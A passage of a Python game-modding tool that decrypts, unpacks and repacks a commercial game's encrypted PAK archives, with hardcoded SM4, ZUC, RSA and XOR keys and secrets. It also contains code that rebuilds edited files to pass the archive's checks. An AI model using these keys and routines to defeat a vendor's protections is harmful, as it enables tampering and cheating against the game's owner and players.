        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[{theme["error"]}]❌ Option {choice} is invalid[/]',
                border_style=theme["error"],
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

# ==================== END PAK + LUA TOOL ====================

# ==================== HR DHAMA - GAMEPATCH STANDALONE TOOL ====================
# Integrated from tool.py - Unpack + Smart Rebuild Only
# Fully developed by HR DHAMA - Integrated by @Black_Toxic000

# ==================== HR DHAMA PATHS ====================
HR_DHAMA_DIR = PAK_LUA_DIR / ""
HR_GAMEPATCH_DIR = HR_DHAMA_DIR / "GAMEPATCH"
HR_INPUT_DIR = HR_GAMEPATCH_DIR / "INPUT"
HR_EDITED_DIR = HR_GAMEPATCH_DIR / "EDITED"
HR_UNPACKED_DIR = HR_GAMEPATCH_DIR / "UNPACKED"
HR_REPACKED_DIR = HR_GAMEPATCH_DIR / "REPACKED"

# ==================== HR DHAMA SM4 IMPLEMENTATION ====================
_HR_S_BOX = bytes([
    0x34, 0x66, 0x25, 0x74, 0x89, 0x78, 0xE4, 0xA9, 0x5A, 0x41, 0xBC, 0x7A, 0xD6, 0x16, 0x21, 0x23,
    0x4D, 0x61, 0xDA, 0x94, 0x9B, 0xDF, 0x13, 0x3C, 0x69, 0x3A, 0x31, 0x0A, 0x5F, 0xD7, 0x99, 0x95,
    0xF1, 0xAE, 0x72, 0x3D, 0x07, 0x60, 0x24, 0xB6, 0x98, 0xEE, 0xC4, 0xA2, 0x2D, 0x88, 0xDD, 0x8D,
    0x04, 0xEA, 0xBB, 0x11, 0xCA, 0x3E, 0x5D, 0xA1, 0xF6, 0x3F, 0xB0, 0x97, 0x80, 0x47, 0x2B, 0xA6,
    0xE6, 0xF7, 0xD9, 0xB1, 0x59, 0xC0, 0x7C, 0xBE, 0x54, 0x28, 0xB7, 0x7E, 0x4F, 0xF8, 0x43, 0x6E,
    0xA0, 0x50, 0x0E, 0xF5, 0x90, 0xB8, 0xFB, 0xA3, 0x7B, 0x62, 0x19, 0x46, 0x03, 0x2A, 0xB9, 0x8F,
    0x9F, 0x77, 0xB4, 0x5B, 0x83, 0x87, 0x08, 0xEB, 0xE2, 0x1E, 0x42, 0xF0, 0x0F, 0xE8, 0x71, 0x6A,
    0x75, 0xAD, 0x55, 0x1F, 0xB5, 0xAB, 0x33, 0xFA, 0x7F, 0x15, 0xBD, 0x85, 0xD8, 0x06, 0x68, 0xB3,
    0x52, 0x30, 0x48, 0x0B, 0x00, 0xED, 0xEF, 0xB2, 0x57, 0x8E, 0xE7, 0x6C, 0xD5, 0xE5, 0x2E, 0x53,
    0x82, 0x05, 0xF9, 0x81, 0xF4, 0x56, 0xBF, 0x8C, 0x4B, 0xE3, 0xDB, 0x4A, 0x91, 0x4C, 0x2C, 0xD3,
    0x40, 0x29, 0x4E, 0x20, 0x14, 0x36, 0x79, 0x09, 0x6F, 0xD1, 0x37, 0xE0, 0x39, 0x0C, 0x8A, 0x92,
    0x38, 0x12, 0x35, 0x6D, 0xE1, 0xFD, 0x93, 0x9A, 0x17, 0xD4, 0xC9, 0x9C, 0x6B, 0x84, 0x26, 0x9D,
    0xAF, 0x76, 0xC1, 0x9E, 0xD0, 0x96, 0xC5, 0xCB, 0xE9, 0x73, 0x49, 0xD2, 0xCD, 0x64, 0xC3, 0xC7,
    0x01, 0x7D, 0xF3, 0xAC, 0xFC, 0xDE, 0xA4, 0x44, 0x32, 0x1B, 0xC2, 0xBA, 0x1C, 0x02, 0xC6, 0x27,
    0x45, 0x8B, 0xF2, 0x18, 0xA7, 0x10, 0x51, 0x1D, 0xC8, 0xCF, 0x63, 0xFF, 0x2F, 0x0D, 0x58, 0xCE,
    0x65, 0xA5, 0xDC, 0x1A, 0x3B, 0x86, 0xFE, 0x22, 0x5C, 0xA8, 0x5E, 0x67, 0xAA, 0xEC, 0x70, 0xCC
])

_HR_FK = [0x46970E9C, 0x4BC0685E, 0x59056186, 0xBCA2491E]

_HR_CK = [
    0x000EB92B, 0x3A0AE783, 0x9E3B5C67, 0xADDBDABF, 0x7B7484CB, 0x49156C63, 0xC79AB5E7, 0x79EC9CFF,
    0x1725BEAB, 0x2FB89CA3, 0x24808AD7, 0xDDD28B1F, 0x4740DA4B, 0xBBC3EA73, 0x247B30E7, 0x91BE385F,
    0x0401248B, 0x45FCD3A3, 0x530B4CE7, 0xC68DD35F, 0xE3D16C2B, 0x4F698C13, 0x6B92C747, 0x769EFB1F,
    0x4C73BE9B, 0xC942B193, 0xAD80D827, 0x372FB33F, 0x13CB6AAB, 0x2BDC0AA3, 0x17A4A247, 0xD5E96CAF
]

def _hr_ROL32(x: int, n: int) -> int:
    return ((x << n) & 0xFFFFFFFF) | (x >> (32 - n))

def _hr_BS(X: int) -> int:
    return ((_HR_S_BOX[(X >> 24) & 0xff] << 24) |
            (_HR_S_BOX[(X >> 16) & 0xff] << 16) |
            (_HR_S_BOX[(X >> 8) & 0xff] << 8) |
            (_HR_S_BOX[X & 0xff]))

def _hr_T0(X: int) -> int:
    X = _hr_BS(X)
    return X ^ _hr_ROL32(X, 2) ^ _hr_ROL32(X, 10) ^ _hr_ROL32(X, 18) ^ _hr_ROL32(X, 24)

def _hr_T1(X: int) -> int:
    X = _hr_BS(X)
    return X ^ _hr_ROL32(X, 13) ^ _hr_ROL32(X, 23)

def _hr_key_expand(key: bytes, rkey: List[int]):
    K0 = int.from_bytes(key[0:4], "big") ^ _HR_FK[0]
    K1 = int.from_bytes(key[4:8], "big") ^ _HR_FK[1]
    K2 = int.from_bytes(key[8:12], "big") ^ _HR_FK[2]
    K3 = int.from_bytes(key[12:16], "big") ^ _HR_FK[3]
    for i in range(0, 32, 4):
        K0 = K0 ^ _hr_T1(K1 ^ K2 ^ K3 ^ _HR_CK[i])
        rkey[i] = K0
        K1 = K1 ^ _hr_T1(K2 ^ K3 ^ K0 ^ _HR_CK[i + 1])
        rkey[i + 1] = K1
        K2 = K2 ^ _hr_T1(K3 ^ K0 ^ K1 ^ _HR_CK[i + 2])
        rkey[i + 2] = K2
        K3 = K3 ^ _hr_T1(K0 ^ K1 ^ K2 ^ _HR_CK[i + 3])
        rkey[i + 3] = K3

class HR_SM4:
    @staticmethod
    def key_length() -> int:
        return 16
    @staticmethod
    def block_length() -> int:
        return 16
    def __init__(self, key: bytes):
        if len(key) != self.key_length():
            raise ValueError(f"Key must be {self.key_length()} bytes, got {len(key)}")
        self._key = key
        self._rkey = [0] * 32
        _hr_key_expand(self._key, self._rkey)
        self._block_buffer = bytearray()
    def encrypt(self, block: bytes) -> bytes:
        if len(block) != self.block_length():
            raise ValueError(f"Block must be {self.block_length()} bytes, got {len(block)}")
        RK = self._rkey
        X0 = int.from_bytes(block[0:4], "big")
        X1 = int.from_bytes(block[4:8], "big")
        X2 = int.from_bytes(block[8:12], "big")
        X3 = int.from_bytes(block[12:16], "big")
        for i in range(32):
            t = X0 ^ _hr_T0(X1 ^ X2 ^ X3 ^ RK[i])
            X0, X1, X2, X3 = X1, X2, X3, t
        return X3.to_bytes(4, "big") + X2.to_bytes(4, "big") + X1.to_bytes(4, "big") + X0.to_bytes(4, "big")
    def decrypt(self, block: bytes) -> bytes:
        if len(block) != self.block_length():
            raise ValueError(f"Block must be {self.block_length()} bytes, got {len(block)}")
        RK = self._rkey
        X0 = int.from_bytes(block[0:4], "big")
        X1 = int.from_bytes(block[4:8], "big")
        X2 = int.from_bytes(block[8:12], "big")
        X3 = int.from_bytes(block[12:16], "big")
        RK_reverse = RK[::-1]
        for i in range(32):
            t = X0 ^ _hr_T0(X1 ^ X2 ^ X3 ^ RK_reverse[i])
            X0, X1, X2, X3 = X1, X2, X3, t
        return X3.to_bytes(4, "big") + X2.to_bytes(4, "big") + X1.to_bytes(4, "big") + X0.to_bytes(4, "big")

# ==================== HR DHAMA CONSTANTS ====================
HR_ZUC_KEY = bytes.fromhex('01010101010101010101010101010101')
HR_ZUC_IV = bytes.fromhex('FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')

HR_RSA_MOD_1 = bytes.fromhex(
    'CBE8B9F2504050EF9831B719E9A6249A6D238505ADE909BDE78C180DED6072A0C3347B8AF4780E1F212D952D82D4BF7F233C1ECA499E1F9D9A85B4FAD759F54BABC1666C5DE411EA9E4B2374425DD6C6F54333BBC8F2610FE6063E4D0D6C21A671A8F7C3740555E5DC06D4E1691C456DB4116C0C012BF7B206E8311AAAEC689952BF804EF638F09D5822B4117B114208F14DEB459E80CB770E5B0D7978E21F5E6CED4999D3583108221A7AB28B960277ADB5690A332784019D9C195BE4EA9EA0A09459010F236465DE0D59C3EF7324E954E1118D93EE19F299760C2CDB963CE87973EA5ECC9BBE81C27D4C7C8572AC07E9BCEAC9BD72AB7A56A3C0AD736ABCE4')
HR_RSA_MOD_2 = bytes.fromhex(
    '7F58E8A39A4DA4E87357DDD650EAA16D3B5CE95B213D1030A662566444796A78A84AE9AC3DBFFDE7F41094896696835DAF13B89E6EC2B84963B1B1BAF7151DA245C3FBFAE2A6AE18B2684D03F9229DE2C91440F2A3A3BCDE1E5680C16722A88039C73560D5D43F4B6562C2EEA5B1D926D86B51108A2643C70FB74D6442CE3A08339B8FD8F660AE88129B7AB8C46F2FA58124485CCCB1E987B05A6DA65A01858ED3F89905449AE42BB07290FCB9994BF22E26610BCABB9804783A3B9587917F3D97316EDDA15C5E13F79066407B55A93B291B68A4AC42A98D6E35FED84B14A792D154E62028DDAD20FC301951E5924BE9AD62FB719DD94CC30CAB871BEC4377A8')

HR_SIMPLE1_DECRYPT_KEY = 0x79
HR_SIMPLE2_DECRYPT_KEY = bytes.fromhex('E55B4ED1')
HR_SIMPLE2_BLOCK_SIZE = 16

HR_SM4_SECRET_4 = 'eb691efea914241317a8'
HR_SM4_SECRET_2 = 'Q0hVTKey$as*1ZFlQCiA'
HR_SM4_SECRET_NEW = [
    'aJ4pV7iZ7pU4wP2aC2cZ', 'aT0cL1yN4pT3sZ7eM2vY', 'dB6lB3vE0eZ8wM8rI0aC',
    'hM1pH9iY8wM9hT4lN5uJ', 'iT2vS0cS6yT6cZ1sE1lO', 'kG6bC8jK0fL0dE4sH4mL',
    'qC4jS5bZ6fL5xE6nD4zA', 'tP7sP7nI9rA2vQ4cV5yQ', 'uQ3cO2dX7xY4xU7gH7iS',
    'uV6fU8fC9zN3mP5dH8mN', 'xG2qW5lP7lV2iN5fN5pG', 'xT1cJ6dL5wC0kK1rB4dK',
    'xU1yQ8wE9zY3gZ3bT5aE'
]

HR_CM_NONE = 0
HR_CM_ZLIB = 1
HR_CM_ZSTD = 6
HR_CM_ZSTD_DICT = 8
HR_CM_MASK = 15

HR_EM_SIMPLE1 = 1
HR_EM_SIMPLE2 = 16
HR_EM_SM4_2 = 2
HR_EM_SM4_4 = 4
HR_EM_SM4_NEW_BASE = 31
HR_EM_SM4_NEW_MASK = ~HR_EM_SM4_NEW_BASE
HR_EM_UNKNOWN_17 = 17

# ==================== HR DHAMA UTILITY CLASSES ====================
class HR_Misc:
    @staticmethod
    def pad_to_n(data: bytes, n: int) -> bytes:
        assert n > 0
        padding = n - len(data) % n
        return data if padding == n else data + b'\x00' * padding
    @staticmethod
    def align_up(x: int, n: int) -> int:
        return (x + n - 1) // n * n

class HR_Reader:
    def __init__(self, buffer, cursor=0):
        self._buffer = buffer
        self._cursor = cursor
    def u1(self, move_cursor=True) -> int:
        return self.unpack('B', move_cursor=move_cursor)[0]
    def u4(self, move_cursor=True) -> int:
        return self.unpack('<I', move_cursor=move_cursor)[0]
    def u8(self, move_cursor=True) -> int:
        return self.unpack('<Q', move_cursor=move_cursor)[0]
    def i1(self, move_cursor=True) -> int:
        return self.unpack('b', move_cursor=move_cursor)[0]
    def i4(self, move_cursor=True) -> int:
        return self.unpack('<i', move_cursor=move_cursor)[0]
    def i8(self, move_cursor=True) -> int:
        return self.unpack('<q', move_cursor=move_cursor)[0]
    def s(self, n: int, move_cursor=True) -> bytes:
        return self.unpack(f'{n}s', move_cursor=move_cursor)[0]
    def unpack(self, f: str, offset=0, move_cursor=True):
        x = struct.unpack_from(f, self._buffer, self._cursor + offset)
        if move_cursor:
            self._cursor += struct.calcsize(f)
        return x
    def string(self, move_cursor=True) -> str:
        length = self.i4(move_cursor=move_cursor)
        if length == 0:
            return ""
        offset = 0 if move_cursor else 4
        return self.unpack(f'{length}s', offset=offset, move_cursor=move_cursor)[0].rstrip(b'\x00').decode()

# ==================== HR DHAMA PAK INFO CLASSES ====================
class HR_PakInfo:
    def __init__(self, buffer, keystream: list[int]):
        def decrypt_index_encrypted(x: int) -> int:
            return (x ^ keystream[3]) & 255
        def decrypt_magic(x: int) -> int:
            return x ^ keystream[2]
        def decrypt_index_hash(x: bytes) -> bytes:
            key = struct.pack('<5I', *keystream[4:][:5])
            assert len(x) == len(key)
            return bytes((a ^ b for a, b in zip(x, key)))
        def decrypt_index_size(x: int) -> int:
            return x ^ (keystream[10] << 32 | keystream[11])
        def decrypt_index_offset(x: int) -> int:
            return x ^ (keystream[0] << 32 | keystream[1])
        reader = HR_Reader(buffer[-HR_PakInfo._mem_size((-1)):])
        self.index_encrypted = decrypt_index_encrypted(reader.u1()) == 1
        self.magic = decrypt_magic(reader.u4())
        self.version = reader.u4()
        self.index_hash = decrypt_index_hash(reader.s(20)) if self.version >= 6 else bytes()
        self.index_size = decrypt_index_size(reader.u8())
        self.index_offset = decrypt_index_offset(reader.u8())
        if self.version <= 3:
            self.index_encrypted = False
    @staticmethod
    def _mem_size(_: int) -> int:
        return 45

class HR_TencentPakInfo(HR_PakInfo):
    def __init__(self, buffer, keystream: list[int]):
        def decrypt_unk(x: bytes) -> bytes:
            key = struct.pack('<8I', *keystream[7:][:8])
            assert len(x) == len(key)
            return bytes((a ^ b for a, b in zip(x, key)))
        def decrypt_stem_hash(x: int) -> int:
            return x ^ keystream[8]
        def decrypt_unk_hash(x: int) -> int:
            return x ^ keystream[9]
        super().__init__(buffer, keystream)
        reader = HR_Reader(buffer[-HR_TencentPakInfo._mem_size(self.version):])
        self.unk1 = decrypt_unk(reader.s(32)) if self.version >= 7 else bytes()
        self.packed_key = reader.s(256) if self.version >= 8 else bytes()
        self.packed_iv = reader.s(256) if self.version >= 8 else bytes()
        self.packed_index_hash = reader.s(256) if self.version >= 8 else bytes()
        self.stem_hash = decrypt_stem_hash(reader.u4()) if self.version >= 9 else 0
        self.unk2 = decrypt_unk_hash(reader.u4()) if self.version >= 9 else 0
        self.content_org_hash = reader.s(20) if self.version >= 12 else bytes()
    @staticmethod
    def _mem_size(version: int) -> int:
        size_for_7 = 32 if version >= 7 else 0
        size_for_8 = 768 if version >= 8 else 0
        size_for_9 = 8 if version >= 9 else 0
        size_for_12 = 20 if version >= 12 else 0
        return HR_PakInfo._mem_size(version) + size_for_7 + size_for_8 + size_for_9 + size_for_12

class HR_PakCompressedBlock:
    def __init__(self, reader: HR_Reader):
        self.start = reader.u8()
        self.end = reader.u8()

@dataclass
class HR_TencentPakEntry:
    def __init__(self, reader: HR_Reader, version: int):
        self.content_hash = reader.s(20)
        if version <= 1:
            _ = reader.u8()
        self.offset = reader.u8()
        self.uncompressed_size = reader.u8()
        self.compression_method = reader.u4() & HR_CM_MASK
        self.size = reader.u8()
        self.unk1 = reader.u1() if version >= 5 else 0
        self.unk2 = reader.s(20) if version >= 5 else bytes()
        self.compressed_blocks = [HR_PakCompressedBlock(reader) for _ in range(reader.u4())] if self.compression_method != 0 and version >= 3 else []
        self.compression_block_size = reader.u4() if version >= 4 else 0
        self.encrypted = reader.u1() == 1 if version >= 4 else False
        self.encryption_method = reader.u4() if version >= 12 else 0
        self.index_new_sep = reader.u4() if version >= 12 else 0

# ==================== HR DHAMA CRYPTO CLASS ====================
class HR_PakCrypto:
    class _LCG:
        def __init__(self, seed: int):
            self.state = seed
        def next(self) -> int:
            MASK_32 = 4294967295
            MSB_1 = 2147483648
            def wrap(x: int) -> int:
                x &= MASK_32
                if not x & MSB_1:
                    return x
                else:
                    return (x + MSB_1 & MASK_32) - MSB_1
            x1 = wrap(1103515245 * self.state)
            self.state = wrap(x1 + 12345)
            x2 = wrap(x1 + 77880) if self.state < 0 else self.state
            return (x2 >> 16 & MASK_32) % 32767
    @staticmethod
    def zuc_keystream() -> list[int]:
        zuc = gmalg.ZUC(HR_ZUC_KEY, HR_ZUC_IV)
        return [struct.unpack('>I', zuc.generate())[0] for _ in range(16)]
    @staticmethod
    def _xorxor(buffer, x) -> bytes:
        return bytes((buffer[i] ^ x[i % len(x)] for i in range(len(buffer))))
    @staticmethod
    def _hashhash(buffer, n: int) -> bytes:
        result = bytes()
        for i in range(math.ceil(n / SHA1.digest_size)):
            result += SHA1.new(buffer).digest()
        if len(result) >= n:
            return result[:n]
        else:
            return result + b'\x00' * (n - len(result))
    @staticmethod
    def _meowmeow(buffer) -> bytes:
        def unpad(x):
            skip = 1 + next((i for i in range(len(x)) if x[i] != 0))
            return x[skip:]
        if len(buffer) < 43:
            return bytes()
        else:
            x1 = buffer[1:][:SHA1.digest_size]
            x2 = buffer[SHA1.digest_size + 1:]
            x1 = HR_PakCrypto._xorxor(x1, HR_PakCrypto._hashhash(x2, len(x1)))
            x2 = HR_PakCrypto._xorxor(x2, HR_PakCrypto._hashhash(x1, len(x2)))
            part1, m = (x2[:SHA1.digest_size], x2[SHA1.digest_size:])
            if part1 != SHA1.new(b'\x00' * SHA1.digest_size).digest():
                return bytes()
            else:
                return unpad(m)
    @staticmethod
    def rsa_extract(signature: bytes, modulus: bytes) -> bytes:
        c = int.from_bytes(signature, 'little')
        n = int.from_bytes(modulus, 'little')
        e = 65537
        m = pow(c, e, n).to_bytes(256, 'little').rstrip(b'\x00')
        return HR_PakCrypto._meowmeow(HR_Misc.pad_to_n(m, 4))
    @staticmethod
    def _decrypt_simple1(ciphertext) -> bytes:
        return bytes((x ^ HR_SIMPLE1_DECRYPT_KEY for x in ciphertext))
    @staticmethod
    def _encrypt_simple1(plaintext: bytes) -> bytes:
        return bytes((b ^ HR_SIMPLE1_DECRYPT_KEY for b in plaintext))
    @staticmethod
    def _decrypt_simple2(ciphertext) -> bytes:
        class RollingKey:
            def __init__(self, initial_value: int):
                self._value = initial_value
            def update(self, x: int) -> int:
                self._value ^= x
                return self._value
        assert len(ciphertext) % HR_SIMPLE2_BLOCK_SIZE == 0
        initial_key, = struct.unpack('<I', HR_SIMPLE2_DECRYPT_KEY)
        rolling_key = RollingKey(initial_key)
        plaintext = (struct.pack('<I', rolling_key.update(x)) for x in struct.unpack(f'<{len(ciphertext) // 4}I', ciphertext))
        return bytes(itertools.chain.from_iterable(plaintext))
    @staticmethod
    def _encrypt_simple2(plaintext) -> bytes:
        class RollingKey:
            def __init__(self, iv):
                self._value = iv
            def update(self, x):
                orig = self._value
                self._value = x
                return orig ^ x
        assert len(plaintext) % HR_SIMPLE2_BLOCK_SIZE == 0
        initial_key, = struct.unpack('<I', HR_SIMPLE2_DECRYPT_KEY)
        rk = RollingKey(initial_key)
        ciphertext = (struct.pack('<I', rk.update(x)) for x in struct.unpack(f'<{len(plaintext)//4}I', plaintext))
        return bytes(itertools.chain.from_iterable(ciphertext))
    @staticmethod
    @lru_cache(maxsize=1)
    def _derive_sm4_key(file_path: PurePath, encryption_method: int) -> bytes:
        part1 = file_path.stem.lower()
        if encryption_method == HR_EM_SM4_2:
            secret = HR_SM4_SECRET_2
        else:
            if encryption_method == HR_EM_SM4_4:
                secret = HR_SM4_SECRET_4
            else:
                index = (encryption_method - HR_EM_SM4_NEW_BASE) % len(HR_SM4_SECRET_NEW)
                secret = f'{HR_SM4_SECRET_NEW[index]}{encryption_method}'
        return SHA1.new(str(part1 + secret).encode()).digest()[:HR_SM4.key_length()]
    @staticmethod
    @lru_cache(maxsize=1)
    def _sm4_context_for_key(key: bytes) -> HR_SM4:
        return HR_SM4(key)
    @staticmethod
    def _decrypt_sm4(ciphertext, file_path: PurePath, encryption_method: int) -> bytes:
        assert len(ciphertext) % HR_SM4.block_length() == 0
        key = HR_PakCrypto._derive_sm4_key(file_path, encryption_method)
        sm4 = HR_PakCrypto._sm4_context_for_key(key)
        return bytes(itertools.chain.from_iterable((sm4.decrypt(x) for x in itertools.batched(ciphertext, HR_SM4.block_length()))))
    @staticmethod
    def _encrypt_sm4(plaintext: bytes, file_path: PurePath, encryption_method: int) -> bytes:
        padded = HR_Misc.pad_to_n(plaintext, HR_SM4.block_length())
        key = HR_PakCrypto._derive_sm4_key(file_path, encryption_method)
        sm4 = HR_PakCrypto._sm4_context_for_key(key)
        encrypted = bytearray()
        for i in range(0, len(padded), HR_SM4.block_length()):
            block = padded[i:i + HR_SM4.block_length()]
            encrypted.extend(sm4.encrypt(block))
        return bytes(encrypted)
    @staticmethod
    def decrypt_index(ciphertext, pak_info: HR_TencentPakInfo) -> bytes:
        if pak_info.version > 7:
            key = HR_PakCrypto.rsa_extract(pak_info.packed_key, HR_RSA_MOD_1)
            iv = HR_PakCrypto.rsa_extract(pak_info.packed_iv, HR_RSA_MOD_1)
            assert len(key) == 32 and len(iv) == 32
            aes = AES.new(key, MODE_CBC, iv[:16])
            decrypted = aes.decrypt(ciphertext)
            try:
                return unpad(decrypted, AES.block_size)
            except ValueError:
                return decrypted
        else:
            return bytes(HR_PakCrypto._decrypt_simple1(ciphertext))
    @staticmethod
    def _is_simple1_method(encryption_method: int) -> bool:
        return encryption_method == HR_EM_SIMPLE1
    @staticmethod
    def _is_simple2_method(encryption_method: int) -> bool:
        return encryption_method == HR_EM_SIMPLE2 or encryption_method == HR_EM_UNKNOWN_17
    @staticmethod
    def _is_sm4_method(encryption_method: int) -> bool:
        return encryption_method == HR_EM_SM4_2 or encryption_method == HR_EM_SM4_4 or encryption_method & HR_EM_SM4_NEW_MASK != 0
    @staticmethod
    def _is_unknown_17_method(encryption_method: int) -> bool:
        return encryption_method == HR_EM_UNKNOWN_17
    @staticmethod
    def align_encrypted_content_size(n: int, encryption_method: int) -> int:
        if HR_PakCrypto._is_simple2_method(encryption_method):
            return HR_Misc.align_up(n, HR_SIMPLE2_BLOCK_SIZE)
        else:
            if HR_PakCrypto._is_sm4_method(encryption_method):
                return HR_Misc.align_up(n, HR_SM4.block_length())
            else:
                return n
    @staticmethod
    def decrypt_block(ciphertext, file: PurePath, encryption_method: int) -> bytes:
        if HR_PakCrypto._is_simple1_method(encryption_method):
            return HR_PakCrypto._decrypt_simple1(ciphertext)
        else:
            if HR_PakCrypto._is_simple2_method(encryption_method):
                return HR_PakCrypto._decrypt_simple2(ciphertext)
            else:
                if HR_PakCrypto._is_sm4_method(encryption_method):
                    return HR_PakCrypto._decrypt_sm4(ciphertext, file, encryption_method)
                else:
                    assert False
    @staticmethod
    def encrypt_block(plaintext: bytes, file: PurePath, encryption_method: int) -> bytes:
        if HR_PakCrypto._is_simple1_method(encryption_method):
            return HR_PakCrypto._encrypt_simple1(plaintext)
        else:
            if HR_PakCrypto._is_simple2_method(encryption_method):
                return HR_PakCrypto._encrypt_simple2(plaintext)
            else:
                if HR_PakCrypto._is_sm4_method(encryption_method):
                    return HR_PakCrypto._encrypt_sm4(plaintext, file, encryption_method)
                else:
                    assert False
    @staticmethod
    @lru_cache(maxsize=33)
    def generate_block_indices(n: int, encryption_method: int) -> list[int]:
        if not HR_PakCrypto._is_sm4_method(encryption_method):
            return list(range(n))
        else:
            permutation = []
            lcg = HR_PakCrypto._LCG(n)
            while len(permutation) != n:
                x = lcg.next() % n
                if x not in permutation:
                    permutation.append(x)
            inverse = [0] * len(permutation)
            for i, x in enumerate(permutation):
                inverse[x] = i
            return inverse

# ==================== HR DHAMA COMPRESSION CLASS ====================
class HR_PakCompression:
    @staticmethod
    @lru_cache(maxsize=33)
    def _zstd_decompressor(dict: ZstdCompressionDict | bytes | None) -> ZstdDecompressor:
        if isinstance(dict, bytes):
            dict = ZstdCompressionDict(dict, DICT_TYPE_AUTO)
        return ZstdDecompressor(dict)
    @staticmethod
    def zstd_dictionary(dict_data) -> ZstdCompressionDict:
        return ZstdCompressionDict(dict_data, DICT_TYPE_AUTO)
    @staticmethod
    def decompress_block(block, dict: ZstdCompressionDict | bytes | None, compression_method: int) -> bytes:
        if compression_method == HR_CM_ZLIB:
            try:
                return zlib.decompress(block)
            except Exception:
                return block
        else:
            if compression_method == HR_CM_ZSTD or compression_method == HR_CM_ZSTD_DICT:
                if compression_method != HR_CM_ZSTD_DICT:
                    dict = None
                return HR_PakCompression._zstd_decompressor(dict).decompress(block)
            else:
                assert False
    @staticmethod
    def compress_block(data: bytes, dict: ZstdCompressionDict | bytes | None, compression_method: int, level: int = 22) -> bytes:
        if compression_method == HR_CM_NONE:
            return data
        if compression_method == HR_CM_ZLIB:
            return zlib.compress(data, level=min(max(level, 1), 9))
        if compression_method == HR_CM_ZSTD:
            return ZstdCompressor(level=min(max(level, 1), 22)).compress(data)
        if compression_method == HR_CM_ZSTD_DICT:
            if dict is None:
                return ZstdCompressor(level=min(max(level, 1), 22)).compress(data)
            if isinstance(dict, bytes):
                dict = ZstdCompressionDict(dict, DICT_TYPE_AUTO)
            return ZstdCompressor(level=min(max(level, 1), 22), dict_data=dict).compress(data)
        raise ValueError(f'Unknown compression method: {compression_method}')
    @staticmethod
    def best_compress_for_slot(data: bytes, dict, compression_method: int, usable_slot: int,
                               methods_fallback: list[int] | None = None) -> tuple[bytes, int, int] | None:
        primary = compression_method
        candidates = [primary]
        if methods_fallback:
            for m in methods_fallback:
                if m not in candidates:
                    candidates.append(m)
        if HR_CM_ZSTD not in candidates and primary != HR_CM_ZSTD:
            candidates.append(HR_CM_ZSTD)
        if HR_CM_ZLIB not in candidates and primary != HR_CM_ZLIB:
            candidates.append(HR_CM_ZLIB)
        for method in candidates:
            max_lvl = 22 if method in (HR_CM_ZSTD, HR_CM_ZSTD_DICT) else 9
            for level in range(max_lvl, 0, -1):
                try:
                    comp = HR_PakCompression.compress_block(data, dict, method, level)
                except Exception:
                    break
                if len(comp) <= usable_slot:
                    return comp, method, level
        return None

# ==================== HR DHAMA TENCENT PAK FILE ====================
class HR_TencentPakFile:
    def __init__(self, file_path: Path, is_od=False):
        self._file_path = file_path
        with open(file_path, 'rb') as file:
            self._file_content = memoryview(file.read())
        self._is_od = is_od
        self._mount_point = PurePath()
        self._is_zstd_with_dict = True
        self._zstd_dict = None
        self._files = []
        self._index: dict[PurePath, dict[str, HR_TencentPakEntry]] = {}
        self._pak_info = HR_TencentPakInfo(self._file_content, HR_PakCrypto.zuc_keystream())
        self._verify_stem_hash()
        self._tencent_load_index()
    def _verify_stem_hash(self) -> None:
        if not self._is_od and self._pak_info.version >= 9:
            assert self._pak_info.stem_hash == zlib.crc32(self._file_path.stem.encode('utf-32le'))
    def _tencent_load_index(self):
        raw_index_data = self._file_content[self._pak_info.index_offset:][:self._pak_info.index_size]
        candidates = []
        errors = []
        def add_candidate(label: str, data):
            if data is None:
                return
            b = bytes(data)
            if not any(existing == b for _, existing in candidates):
                candidates.append((label, b))
        if self._pak_info.index_encrypted:
            try:
                add_candidate('AES/RSA encrypted index', HR_PakCrypto.decrypt_index(raw_index_data, self._pak_info))
            except Exception as e:
                errors.append(f'AES/RSA decrypt failed: {type(e).__name__}: {e}')
            try:
                add_candidate('SIMPLE1 fallback index', HR_PakCrypto._decrypt_simple1(bytes(raw_index_data)))
            except Exception as e:
                errors.append(f'SIMPLE1 fallback failed: {type(e).__name__}: {e}')
            add_candidate('RAW index fallback', raw_index_data)
        else:
            add_candidate('RAW index', raw_index_data)
        last_error = None
        for label, index_data in candidates:
            verify_ok = True
            try:
                self._verify_index_hash(index_data)
            except Exception as e:
                verify_ok = False
                errors.append(f'{label} hash verify warning: {type(e).__name__}: {e}')
            old_mount = self._mount_point
            old_files = self._files
            old_index = self._index
            old_dict = self._zstd_dict
            try:
                self._mount_point = PurePath()
                self._files = []
                self._index = {}
                self._zstd_dict = None
                self._load_index(index_data)
                if not verify_ok:
                    console.print(f'[yellow]⚠ Loaded PAK index using {label}, but hash verification failed.[/yellow]')
                return
            except Exception as e:
                last_error = e
                errors.append(f'{label} parse failed: {type(e).__name__}: {e}')
                self._mount_point = old_mount
                self._files = old_files
                self._index = old_index
                self._zstd_dict = old_dict
        detail = '\n'.join(errors[-6:]) if errors else str(last_error)
        raise RuntimeError(
            'Could not load PAK index. If this is GAMEPATCH/OD PAK, make sure the file is decrypted first.\n'
            f'Details:\n{detail}'
        )
    def _verify_index_hash(self, index_data) -> None:
        expected_hash = self._pak_info.index_hash
        if not self._is_od and self._pak_info.version >= 8:
            assert expected_hash == HR_PakCrypto.rsa_extract(self._pak_info.packed_index_hash, HR_RSA_MOD_2)
        assert expected_hash == SHA1.new(index_data).digest()
    @staticmethod
    def _construct_mount_point(mount_point: str) -> PurePath:
        result = PurePath()
        for part in PurePath(mount_point).parts:
            if part != '..':
                result /= part
        return result
    def _peek_content(self, offset: int, size: int, method: int) -> memoryview:
        size = HR_PakCrypto.align_encrypted_content_size(size, method)
        return self._file_content[offset:][:size]
    def _peek_block_content(self, block: HR_PakCompressedBlock, method: int) -> memoryview:
        size = HR_PakCrypto.align_encrypted_content_size(block.end - block.start, method)
        return self._file_content[block.start:][:size]
    def _construct_zstd_dict(self, dict_entry: HR_TencentPakEntry) -> None:
        assert not self._zstd_dict
        assert not dict_entry.encrypted
        assert dict_entry.compression_method == HR_CM_NONE
        reader = HR_Reader(self._peek_content(dict_entry.offset, dict_entry.size, 0))
        dict_size = reader.u8()
        _ = reader.u4()
        assert dict_size == reader.u4()
        dict_data = reader.s(dict_size)
        if isinstance(dict_data, tuple):
            dict_data = dict_data[0] if dict_data else b''
